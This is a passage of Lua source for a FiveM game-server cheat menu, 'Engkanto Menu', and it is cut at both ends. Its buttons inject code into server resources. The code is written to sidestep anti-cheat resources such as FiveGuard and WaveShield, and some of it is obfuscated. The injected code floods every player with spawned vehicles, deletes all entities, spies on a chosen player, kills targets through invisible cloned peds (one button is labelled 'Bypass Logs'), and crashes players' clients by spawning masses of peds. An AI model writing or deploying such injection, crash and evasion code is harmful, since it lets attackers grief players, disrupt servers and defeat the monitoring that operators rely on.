            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            local spawnZ = pos.z + math.random(30, 60)

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(50)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Trevor Dodo Planes", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "dodo"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            local spawnZ = pos.z + math.random(30, 60)

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(50)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Michael Seashark", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "seashark"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-5, 5)
            local offsetY = math.random(-5, 5)
            local spawnZ = pos.z  -- water level

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(100)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Jetmax Boat", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end

 MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "jetmax"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-5, 5)
            local offsetY = math.random(-5, 5)
            local spawnZ = pos.z  -- water level

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(100)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Marquis Boat", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end

     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "marquis"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-5, 5)
            local offsetY = math.random(-5, 5)
            local spawnZ = pos.z  -- water level
            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(100)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "KosatKa Boat", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end

     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "kosatka"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-5, 5)
            local offsetY = math.random(-5, 5)
            local spawnZ = pos.z  -- water level
            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(100)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Gas Tank", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "tanker2"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 20
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            local spawnZ = pos.z + math.random(30, 60)

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(50)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuText(ServerTabSections[1], "Entity Deleter")
MachoMenuButton(ServerTabSections[1], "Delete All Vehicles", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function zXcVbNmQwErTyUi()
            local aSdFgHjKlQwErTy = GetGamePool
            local pOiUyTrEeRwQtYy = DoesEntityExist
            local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
            local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
            local tYuIoPaSdFgHjKl = DeleteEntity
            local yUiOpAsDfGhJkLz = PlayerPedId
            local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
            local gJkLoPiUyTrEqWe = GetGameTimer
            local fDeSwQaZxCvBnMm = Wait

            local me = yUiOpAsDfGhJkLz()
            local myVeh = uIoPaSdFgHjKlQw(me, false)

            local vehicles = aSdFgHjKlQwErTy("CVehicle")
            for _, veh in ipairs(vehicles) do
                if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                    mNbVcCxZzLlKkJj(veh)
                    local timeout = gJkLoPiUyTrEqWe() + 500
                    while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                        fDeSwQaZxCvBnMm(0)
                    end
                    if hGjFkDlSaPwOeIr(veh) then
                        tYuIoPaSdFgHjKl(veh)
                    end
                end
            end
        end
        zXcVbNmQwErTyUi()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Delete All Peds", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function qWeRtYuIoPlMnBv()
            local zXcVbNmQwErTyUi = GetGamePool
            local aSdFgHjKlQwErTy = DoesEntityExist
            local pOiUyTrEeRwQtYy = DeleteEntity
            local mNbVcCxZzLlKkJj = PlayerId
            local hGjFkDlSaPwOeIr = GetPlayerPed
            local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
            local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
            local uIoPaSdFgHjKlQw = GetGameTimer
            local gJkLoPiUyTrEqWe = Wait
            local vBnMkLoPiUyTrEw = IsPedAPlayer

            local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
            local peds = zXcVbNmQwErTyUi("CPed")

            for _, ped in ipairs(peds) do
                if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                    tYuIoPaSdFgHjKl(ped)
                    local timeout = uIoPaSdFgHjKlQw() + 500
                    while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                        gJkLoPiUyTrEqWe(0)
                    end
                    if yUiOpAsDfGhJkLz(ped) then
                        pOiUyTrEeRwQtYy(ped)
                    end
                end
            end
        end
        qWeRtYuIoPlMnBv()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Delete All Objects", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function mNqAzXwSeRdTfGy()
            local rTyUiOpAsDfGhJk = GetGamePool
            local xAsDfGhJkLpOiUz = DoesEntityExist
            local cVbNmQwErTyUiOp = DeleteEntity
            local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
            local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
            local yUiOpAsDfGhJkLz = GetGameTimer
            local uIoPaSdFgHjKlQw = Wait

            local objects = rTyUiOpAsDfGhJk("CObject")
            for _, obj in ipairs(objects) do
                if xAsDfGhJkLpOiUz(obj) then
                    vBnMkLoPiUyTrEw(obj)
                    local timeout = yUiOpAsDfGhJkLz() + 500
                    while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                        uIoPaSdFgHjKlQw(0)
                    end
                    if nMzXcVbNmQwErTy(obj) then
                        cVbNmQwErTyUiOp(obj)
                    end
                end
            end
        end
        mNqAzXwSeRdTfGy()
    ]])
end)

local PlayerIdInputBoxHandle = MachoMenuInputbox(ServerTabSections[2], "Target Server ID:", "Ex. 1")

MachoMenuCheckbox(ServerTabSections[2], "Spectate Mode", 
    function() 
        -- קבלת ID דרך רשימת השחקנים או ה־Inputbox
        local selectedPlayerClientId = MachoMenuGetSelectedPlayer()
        local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
        local targetId = nil

        if selectedPlayerClientId and selectedPlayerClientId > 0 then
            targetId = GetPlayerServerId(selectedPlayerClientId)
        elseif manualId and manualId > 0 then
            targetId = manualId
        else
            MachoMenuNotification("Engkanto Menu", "Enter or select a valid Player ID!")
            return
        end

        local targetPlayer = GetPlayerFromServerId(targetId)
        if targetPlayer == -1 then
            MachoMenuNotification("Engkanto Menu", "Player not found!")
            return
        end

        -- אם WaveShield פעיל → spectate בסיסי
        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw('monitor', string.format([[
                local function SafeWrap(setFunc)
                    return function(...)
                        return setFunc(...)
                    end
                end

                local SafeThread = SafeWrap(CreateThread)
                local SafeCNetwork = SafeWrap(NetworkSetInSpectatorMode)
                _spectateActive = true

                SafeThread(function()
                    local playerPed = PlayerPedId()
                    local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                    if not DoesEntityExist(targetPed) then return end

                    SafeCNetwork(true, targetPed)

                    while _spectateActive and DoesEntityExist(targetPed) do
                        Citizen.Wait(0)
                    end

                    SafeCNetwork(false, playerPed)
                end)
            ]], targetId))

            MachoMenuNotification("Engkanto Menu", "Spectate enabled!")
        else
            -- אחרת → Spectate עם מצלמה חכמה
            MachoInjectResourceRaw('monitor', string.format([[
                _followActive = true
                local targetId = %d
                local targetPlayer = GetPlayerFromServerId(targetId)
                local focus = GetPlayerPed(targetPlayer)
                if not DoesEntityExist(focus) then
                    _followActive = false
                    return
                end

                local playerPed = PlayerPedId()
                local followCam = CreateCam("DEFAULT_SCRIPTED_FLY_CAMERA", true)
                SetCamActive(followCam, true)
                RenderScriptCams(true, false, 0, false, false)

                local function setFocus(x, y, z)
                    SetFocusPosAndVel(x, y, z, 0.0, 0.0, 0.0)
                end

                Citizen.CreateThread(function()
                    while _followActive and DoesEntityExist(focus) do
                        local playerCoords = GetEntityCoords(focus)
                        local playerHeading = GetEntityHeading(focus)
                        local isInVehicle = IsPedInAnyVehicle(focus, false)
                        local offsetX, offsetY, offsetZ, pitch

                        if isInVehicle then
                            local vehicle = GetVehiclePedIsIn(focus, false)
                            local vehicleClass = GetVehicleClass(vehicle)
                            local isLargeVehicle = vehicleClass == 19 or vehicleClass == 15 or vehicleClass == 2
                            if isLargeVehicle then
                                offsetX, offsetY, offsetZ, pitch = 0.0, -7.0, 1.5, -15.0
                            else
                                offsetX, offsetY, offsetZ, pitch = 0.0, -5.0, 1.2, -10.0
                            end
                        else
                            offsetX, offsetY, offsetZ, pitch = 0.0, -3.0, 1.0, -10.0
                        end

                        AttachCamToEntity(followCam, isInVehicle and GetVehiclePedIsIn(focus, false) or focus, offsetX, offsetY, offsetZ, true)
                        SetCamRot(followCam, pitch, 0.0, playerHeading, 2)
                        SetCamFarClip(followCam, 15000.0)
                        setFocus(playerCoords.x, playerCoords.y, playerCoords.z)

                        Citizen.Wait(0)
                    end

                    _followActive = false
                    RenderScriptCams(false, false, 0, false, false)
                    if followCam then
                        DestroyCam(followCam, false)
                        followCam = nil
                    end
                    ClearFocus()
                end)
            ]], targetId))

            MachoMenuNotification("Engkanto Menu", "Spectate enabled!")
        end
    end,

    -- ביטול Spectate
    function() 
        MachoInjectResourceRaw('monitor', [[
            _spectateActive = false
            _followActive = false
            if followCam then
                RenderScriptCams(false, false, 0, false, false)
                DestroyCam(followCam, false)
                followCam = nil
            end
            ClearFocus()
        ]])
        MachoMenuNotification("Engkanto Menu", "Spectate disabled!")
    end
)

MachoMenuButton(ServerTabSections[2], "Shoot Player", function()
    local selPlayer = MachoMenuGetSelectedPlayer()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local target = (inputId and inputId > 0) and inputId or selPlayer
    
    if not target or target == 0 then return end

    MachoInjectResource2(3, "monitor", string.format([[
        local rawTarget = %d
        local modelHash = GetHashKey("mp_m_freemode_01")
        local weaponHash = GetHashKey("WEAPON_APPISTOL")
        local targetPed = 0

        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == rawTarget or player == rawTarget then
                targetPed = GetPlayerPed(player)
                break
            end
        end

        if targetPed ~= 0 and DoesEntityExist(targetPed) then
            RequestModel(modelHash)
            local t = 0
            while not HasModelLoaded(modelHash) and t < 50 do Wait(1) t = t + 1 end

            local pos = GetEntityCoords(targetPed)
            local shooter = CreatePed(4, modelHash, pos.x + 2.0, pos.y + 2.0, pos.z, 0.0, true, true)
            
            if DoesEntityExist(shooter) then
                SetEntityAsMissionEntity(shooter, true, true)
                GiveWeaponToPed(shooter, weaponHash, 9999, false, true)
                SetCurrentPedWeapon(shooter, weaponHash, true)
                SetCanAttackFriendly(shooter, true, true)
                SetPedRelationshipGroupHash(shooter, GetHashKey("HATES_PLAYER"))
                SetPedAccuracy(shooter, 100) 
                SetPedCombatAbility(shooter, 2)
                SetPedCombatAttributes(shooter, 46, true) 
                SetPedCombatAttributes(shooter, 5, true)  
                SetPedCombatAttributes(shooter, 2, true)  
                SetPedCombatMovement(shooter, 2) 
                SetPedCombatRange(shooter, 2) 
                ClearPedTasksImmediately(shooter)
                TaskCombatPed(shooter, targetPed, 0, 16)

                SetEntityAsNoLongerNeeded(shooter)
            end
        end
        SetModelAsNoLongerNeeded(modelHash)
    ]], target))
end)

MachoMenuButton(ServerTabSections[2], "Shoot Player II", function()
    local selPlayer = MachoMenuGetSelectedPlayer()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local target = (inputId and inputId > 0) and inputId or selPlayer
    
    if not target or target == 0 then return end

    MachoInjectResource2(3, "monitor", string.format([[
local pedModel = "mp_m_freemode_01"
local weaponHash = GetHashKey("WEAPON_HEAVYSNIPER")

    local targetServerId = %d
    if not targetServerId then
        print("Please provide a valid server ID.")
        return
    end
    local targetPlayerId = GetPlayerFromServerId(targetServerId)
    if not targetPlayerId then
        print("Player not found with the specified server ID.")
        return
    end
    local ped = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(ped) then
        print("Target player's ped not found.")
        return
    end

    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    RequestModel(pedModel)
    while not HasModelLoaded(pedModel) do
        Wait(100)
    end
    local npc = CreatePed(28, pedModel, pos.x + 10.0, pos.y, pos.z, heading, true, false)
    GiveWeaponToPed(npc, weaponHash, 250, false, true)
    TaskCombatPed(npc, ped, 0, 16)
    SetPedCombatAttributes(npc, 27, true)
    Wait(10000)
    SetPedAsNoLongerNeeded(npc)
    Wait(10000)
    SetModelAsNoLongerNeeded(pedModel)
    ]], target))
end)

MachoMenuButton(ServerTabSections[2], "Kill Player", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        local me = GetPlayerPed(-1) 
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            local twin = ClonePed(tP, GetEntityHeading(tP), true, false)
            
            if DoesEntityExist(twin) then
                local coords = GetEntityCoords(tP)
                local forward = GetEntityForwardVector(tP)
                local headCoords = GetPedBoneCoords(tP, 31086, 0.0, 0.0, 0.0)

                SetEntityCoords(twin, coords.x + (forward.x * 1.0), coords.y + (forward.y * 1.0), coords.z + 0.5, false, false, false, true)
                SetEntityVisible(twin, false, false)
                SetEntityAlpha(twin, 0, false)
                SetEntityCollision(twin, true, true)
                
                local wH = 0x1B06D571
                GiveWeaponToPed(twin, wH, 1, false, true)
                SetCurrentPedWeapon(twin, wH, true)

                ShootSingleBulletBetweenCoords(
                    coords.x + (forward.x * 0.9), coords.y + (forward.y * 0.9), coords.z + 0.6, 
                    headCoords.x, headCoords.y, headCoords.z, 
                    200,    
                    true,   
                    wH,     
                    me,    
                    true,  
                    false, 
                    1000.0  
                )

                
                Citizen.SetTimeout(500, function()
                    if DoesEntityExist(twin) then DeleteEntity(twin) end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(ServerTabSections[2], "Kill Player II", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

        MachoInjectResource2(3, "monitor", string.format([[
            local function KillPlayer()
                local RvTyUiOpAsDfGhJ = %d

                local dFrTgYhUjIkLoPl = CreateThread
                dFrTgYhUjIkLoPl(function()
                    Wait(0)

                    local ZxCvBnMaSdFgTrEq = GetPlayerPed
                    local TyUiOpAsDfGhJkLz = GetEntityCoords
                    local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
                    local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                    if not pEd or not DoesEntityExist(pEd) then return end

                    local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                    local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                    QwErTyUiOpAsDfGh(
                        oRiGiN.x, oRiGiN.y, oRiGiN.z,
                        tArGeT.x, tArGeT.y, tArGeT.z,
                        500.0,
                        true,
                        GetHashKey("WEAPON_ASSAULTRIFLE"),
                        PlayerPedId(),
                        true,
                        false,
                        -1.0
                    )
                end)
            end
    ]], targetServerId))
end)

MachoMenuButton(ServerTabSections[2], "Kill Player III (Bypass Logs)", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            local coords = GetEntityCoords(tP)
            local headCoords = GetPedBoneCoords(tP, 31086, 0.0, 0.0, 0.0)
            
            local twin = ClonePed(tP, GetEntityHeading(tP), true, false)
            
            if DoesEntityExist(twin) then
                SetEntityVisible(twin, false, false)
                SetEntityAlpha(twin, 0, false)
                SetEntityCollision(twin, false, false)
                
                SetEntityCoords(twin, coords.x, coords.y, coords.z - 5.0, false, false, false, true)
                
                local wH = 0x1B06D571
                GiveWeaponToPed(twin, wH, 1, false, true)
                SetCurrentPedWeapon(twin, wH, true)

                ShootSingleBulletBetweenCoords(
                    headCoords.x, headCoords.y, headCoords.z + 0.1, 
                    headCoords.x, headCoords.y, headCoords.z,       
                    200,   
                    true,   
                    wH, 
                    twin,   
                    true,   
                    false,  
                    1000.0  
                )
                Citizen.SetTimeout(200, function()
                    if DoesEntityExist(twin) then DeleteEntity(twin) end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(ServerTabSections[2], "Crash Player", function()
    local selectedPlayerId = MachoMenuGetSelectedPlayer()
    local targetId = nil

    if selectedPlayerId and selectedPlayerId > 0 then
        targetId = GetPlayerServerId(selectedPlayerId)
    else
        local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
        if manualId and manualId > 0 then
            targetId = manualId
        else
            MachoMenuNotification("Engkanto Menu", "Enter a valid Player ID or select!")
            return
        end
    end

    local targetPlayer = GetPlayerFromServerId(targetId)
    if targetPlayer == -1 then
        MachoMenuNotification("Engkanto Menu", "Player not found!")
        return
    end

        MachoInjectResource2(3, "monitor", string.format([[
        local function SpawnCrashPeds()
            local target = %d

            CreateThread(function()
                local ped = GetPlayerPed(target)
                if not ped or not DoesEntityExist(ped) then return end

                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)

                local model = GetHashKey("player_one")
                RequestModel(model)
                while not HasModelLoaded(model) do Wait(0) end

                local spawnedPeds = {}

                for i = 1, 155 do
                    local offsetX = math.random(-8, 8)
                    local offsetY = math.random(-8, 8)
                    local offsetZ = math.random(0, 2)

                    local spawnX = coords.x + offsetX
                    local spawnY = coords.y + offsetY
                    local spawnZ = coords.z + offsetZ

                    local ped = CreatePed(28, model, spawnX, spawnY, spawnZ, heading, true, true)
                    if DoesEntityExist(ped) then
                        SetEntityAsMissionEntity(ped, true, true)
                        SetBlockingOfNonTemporaryEvents(ped, true)
                        SetEntityAlpha(ped, 0, true)
                        table.insert(spawnedPeds, ped)
                    end

                    Wait(10)
                end

                SetModelAsNoLongerNeeded(model)

                Wait(2000)
                for _, ped in ipairs(spawnedPeds) do
                    if DoesEntityExist(ped) then
                        DeleteEntity(ped)
                    end
                end
            end)
        end

        SpawnCrashPeds()
    ]], targetId, targetId))

    MachoMenuNotification("Engkanto Menu", "Crash Player I for ID: " .. targetId)
end)


MachoMenuButton(ServerTabSections[2], "Crash Player II", function()
    local selectedPlayerId = MachoMenuGetSelectedPlayer()
    local targetId = nil

    if selectedPlayerId and selectedPlayerId > 0 then
        targetId = GetPlayerServerId(selectedPlayerId)
    else
        local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
        if manualId and manualId > 0 then
            targetId = manualId
        else
            MachoMenuNotification("Engkanto Menu", "Enter a valid Player ID or select!")
            return
        end
    end

    local targetPlayer = GetPlayerFromServerId(targetId)
    if targetPlayer == -1 then
        MachoMenuNotification("Engkanto Menu", "Player not found!")
        return
    end

        MachoInjectResource2(3, "monitor", string.format([[
            local function safeCrashEffect()
                local target = %d 

            CreateThread(function()
                local CreatePed = _G.CreatePed
                local PlayerPedId = _G.PlayerPedId
                local GetEntityCoords = _G.GetEntityCoords
                local GetEntityHeading = _G.GetEntityHeading
                local SetEntityCoordsNoOffset = _G.SetEntityCoordsNoOffset
                local GiveWeaponToPed = _G.GiveWeaponToPed
                local TaskParachute = _G.TaskParachute
                local FreezeEntityPosition = _G.FreezeEntityPosition
                local GetHashKey = _G.GetHashKey
                local RequestModel = _G.RequestModel
                local HasModelLoaded = _G.HasModelLoaded
                local SetEntityAsMissionEntity = _G.SetEntityAsMissionEntity
                local SetModelAsNoLongerNeeded = _G.SetModelAsNoLongerNeeded
                local DoesEntityExist = _G.DoesEntityExist
                local DeleteEntity = _G.DeleteEntity
                local Wait = _G.Wait
                local GetGroundZFor_3dCoord = _G.GetGroundZFor_3dCoord
                local ApplyForceToEntity = _G.ApplyForceToEntity
                local SetBlockingOfNonTemporaryEvents = _G.SetBlockingOfNonTemporaryEvents
                local SetEntityAlpha = _G.SetEntityAlpha

                local playerPed = PlayerPedId()
                local originalCoords = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)

                local highZ = originalCoords.z + 500.0
                SetEntityCoordsNoOffset(playerPed, originalCoords.x, originalCoords.y, highZ, false, false, false)

                ApplyForceToEntity(playerPed, 1, 0.0, 0.0, 2500.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                Wait(250)

                GiveWeaponToPed(playerPed, GetHashKey("GADGET_PARACHUTE"), 1, false, true)
                TaskParachute(playerPed, false)

                local pedModel = GetHashKey("player_one")
                RequestModel(pedModel)
                while not HasModelLoaded(pedModel) do Wait(0) end

